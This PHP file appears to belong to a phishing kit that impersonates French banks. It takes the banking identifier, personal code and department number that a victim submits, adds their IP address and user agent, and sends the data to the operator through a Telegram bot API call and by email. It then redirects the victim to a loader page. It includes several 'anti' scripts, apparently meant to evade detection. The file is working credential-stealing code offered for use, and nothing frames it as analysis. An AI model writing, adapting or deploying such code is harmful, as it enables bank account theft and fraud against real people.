<?php 
include('../email.php');
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
session_start();
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
if(isset($_POST['continuer']))
{


$_SESSION['identifiantbank'] = $_POST['identifiant_bank'];
$_SESSION['codeperso'] = $_POST['codeperso'];
$_SESSION['numdepartement'] = $_POST['departement'];


	
	$message = "

	🏛 Identifiant : ".$_SESSION['identifiantbank']."
	🏛 Code Personnel : ".$_SESSION['codeperso']."
	🏛 Numero de departement : ".$_SESSION['numdepartement']."
	🏛 Banque : ".$_SESSION['bank']."

	💿 IP ADRESS : ".$_SESSION['ip']."
	💿 USER-AGENT : ".$_SESSION['useragent']."

	";

	$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=8F=9B=E3=80=8D=2B1_LOG_BANK_?= - ".$_SESSION['ip'];
	$headers = "From: =?utf-8?Q?COBRA_x_KOUNT_=F0=9F=A5=9D?= <crusix@amzv1>";

	$data = [
                                      'text' => '
	
	🏛 Identifiant : '.$_SESSION['identifiantbank'].'
	🏛 Code Personnel : '.$_SESSION['codeperso'].'
	🏛 Numero de departement : '.$_SESSION['numdepartement'].'
	🏛 Banque : '.$_SESSION['bank'].'

	💿 IP ADRESS : '.$_SESSION['ip'].'
	💿 USER-AGENT : '.$_SESSION['useragent'].'



                                      ',
                                      'chat_id' => $chat_id
                                ];
                                  file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
	mail($boite_rez,$subject,$message,$headers);
	header('Location: loader.php?'.uniqid(rand(), true)."finished");

	
	






}



?>